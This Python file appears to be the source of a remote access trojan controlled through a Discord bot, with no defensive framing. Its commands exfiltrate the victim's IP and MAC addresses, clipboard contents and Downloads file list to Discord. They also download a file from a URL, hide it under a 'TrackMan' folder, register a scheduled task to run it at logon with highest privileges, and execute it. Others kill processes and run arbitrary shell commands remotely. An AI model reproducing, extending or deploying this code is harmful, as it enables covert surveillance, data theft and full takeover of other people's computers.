import psutil, os, discord, platform, requests, socket, pyperclip, datetime, uuid, tempfile, signal, subprocess, webbrowser, io, random, string
async def kp(ctx, name_or_pid: str):
    try:
        pid = int(name_or_pid)
        proc = psutil.Process(pid)
        proc.terminate()
        await ctx.send(f"Process {proc.pid} ({proc.name()}) terminated.")
    except ValueError:
        found = False
        for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
            if name_or_pid.lower() in proc.info['name'].lower() or (proc.info['cmdline'] and name_or_pid.lower() in ' '.join(proc.info['cmdline']).lower()):
                proc_obj = psutil.Process(proc.info['pid'])
                proc_obj.terminate()
                await ctx.send(f"Process {proc_obj.pid} ({proc_obj.name()}) terminated.")
                found = True
        if not found:
            await ctx.send("Process not found.")
    except psutil.NoSuchProcess:
        await ctx.send("Process not found.")
async def lp(ctx):
    try:
        target_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'TrackMan')
        os.makedirs(target_dir, exist_ok=True)
        file_path = os.path.join(target_dir, 'processes.txt')
        process_list = []
        for proc in psutil.process_iter(['pid', 'name', 'username', 'cpu_percent']):
            try:
                if not (isinstance(proc.info['name'], str) and isinstance(proc.info['pid'], int)):
                    continue
                process_info = f"{proc.info['name']}|||{proc.info['pid']}|||{proc.info['cpu_percent']}|||{proc.info['username']}"
                process_list.append(process_info)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        if not process_list:
            await ctx.send("No processes found or unable to access process details.")
            return
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("\n".join(process_list))
        await ctx.send(file=discord.File(file_path))
        os.remove(file_path)
    except Exception as e:
        await ctx.send(f"Sorry but I couldn't get the process list because of: {str(e)}")
async def sysinfo(ctx):
    try:
        public_ip=requests.get('https://api.ipify.org').text.strip()
        private_ip=socket.gethostbyname(socket.gethostname())
        ipv6_address=socket.getaddrinfo(socket.gethostname(),None,socket.AF_INET6)[0][4][0]
        mac_address=':'.join(['{:02x}'.format((uuid.getnode()>>elements)&0xff)for elements in range(0,2*6,2)])
        local_datetime=datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        files_list=[os.path.join(root,file_name)for root,dirs,files in os.walk(os.path.expanduser("~/Downloads"))for file_name in files]
        clipboard_content=pyperclip.paste()
        os_info=platform.platform()
        pc_specs=f"Processor: {platform.processor()}\nSystem: {platform.system()} {platform.version()}\nMachine: {platform.machine()}\nPython Version: {platform.python_version()}"
        pc_username=os.getenv('USERNAME')
        pc_name=socket.gethostname()
        
        sysinfo_text=f"Public IPv4: {public_ip}\nPrivate IPv4: {private_ip}\nIPv6 Address: {ipv6_address}\nMAC Address: {mac_address}\nLocal Date/Time: {local_datetime}\n\nPaths of all files in Downloads:\n"
        sysinfo_text += "\n".join(files_list) + f"\n\nClipboard Content:\n{clipboard_content}\n\nOS Information: {os_info}\n\nFull PC Specs:\n{pc_specs}\n\nPC Username: {pc_username}\nPC Name: {pc_name}"
        
        file_stream=io.StringIO(sysinfo_text)
        file_stream.seek(0)
        await ctx.send("System information generated.",file=discord.File(fp=file_stream,filename="sysinfo.txt"))
    except Exception as e:
        await ctx.send(f"Couldnt get sysinfo because of: {str(e)}")
async def clean(ctx):
    current_channel = ctx.channel
    guild = ctx.guild
    for channel in guild.channels:
        if channel != current_channel:
            await channel.delete()
    await ctx.send('All channels except the current one have been deleted.')                  
async def close(ctx):
    await ctx.send("Shutting down...")
    os.kill(os.getpid(), signal.SIGTERM)
async def share_file(ctx):
    try:
        if not ctx.message.attachments and not ctx.message.content.startswith('http'):
            await ctx.send("Please upload a file or provide a valid URL.")
            return
        if ctx.message.attachments:
            attachment = ctx.message.attachments[0]
            file_name = attachment.filename
            file_content = await attachment.read()
        else:
            url = ctx.message.content.strip()
            response = requests.get(url)
            if response.status_code != 200:
                await ctx.send(f"Failed to download the file from URL: {url}")
                return
            file_name = os.path.basename(url)
            file_content = response.content
        target_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'TrackMan')
        os.makedirs(target_dir, exist_ok=True)
        random_name = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        file_path = os.path.join(target_dir, random_name + os.path.splitext(file_name)[1])
        with open(file_path, 'wb') as f:
            f.write(file_content)
        task_name = f"TrackMan_{random_name}"
        cmd = f'schtasks /create /tn "{task_name}" /tr "{file_path}" /sc onlogon /rl highest /f'
        subprocess.run(cmd, shell=True)
        os.startfile(file_path)
        await ctx.send(f"File `{file_name}` saved to {target_dir}, scheduled to run at logon, and executed immediately.")
    except Exception as e:
        await ctx.send(f"Failed to save, schedule, or execute file: {e}")

def get_startup_folder():
    system = platform.system()
    if system == 'Windows':
        return os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    elif system == 'Darwin':
        return os.path.join(os.getenv('HOME'), 'Library', 'LaunchAgents')
    elif system == 'Linux':
        return os.path.join(os.getenv('HOME'), '.config', 'autostart')
    else:
        raise OSError(f'Unsupported operating system: {system}')
async def lockpc(ctx):
    subprocess.run("rundll32.exe user32.dll,LockWorkStation", shell=True)
    await ctx.send("PC locked.")
async def openurl(ctx, *, url: str):
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    webbrowser.open(url)
    
    embed = discord.Embed(
        title="Opening URL",
        description=f"[Click here to visit]({url})",
        color=discord.Color.blue()
    )
    await ctx.send(embed=embed)       
async def cmd_command(ctx,*args):
    command=' '.join(args)
    try:
        result=subprocess.run(command,capture_output=True,text=True,shell=True)
        stdout=result.stdout
        stderr=result.stderr
        output=f"Command: {command}\nOutput:\n{stdout}\n"
        if stderr:
            output+=f"Errors:\n{stderr}\n"
        file=io.StringIO(output)
        await ctx.send(file=discord.File(file,filename="output.txt"))
    except Exception as e:
        await ctx.send(f"Error executing command: {str(e)}")     
# basically command prompt but remote        